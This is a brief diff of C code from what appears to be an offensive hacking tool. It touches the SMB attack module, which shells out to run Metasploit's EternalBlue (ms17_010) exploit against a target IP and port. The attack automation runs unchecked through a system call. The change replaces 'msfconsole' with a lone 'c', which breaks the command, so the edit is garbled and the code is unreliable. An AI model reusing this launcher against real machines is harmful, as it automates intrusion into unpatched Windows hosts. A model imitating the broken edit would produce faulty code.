@@ -356,7 +356,7 @@ int smb(int type){
 		smb_banner_grabbing();
 		break;
 	case SMB_ETERNAL_BLUE:
-		snprintf(cmd,sizeof(cmd),"msfconsole -q -x 'use windows/smb/ms17_010_eternalblue;set RHOSTS %s; set RPORT %d; run; exit'", target.strTargetIp,portUnderHacking);
+		snprintf(cmd,sizeof(cmd),"c -q -x 'use windows/smb/ms17_010_eternalblue;set RHOSTS %s; set RPORT %d; run; exit'", target.strTargetIp,portUnderHacking);
 		system_call(cmd);
 		break;
 	case SMB_BFA:
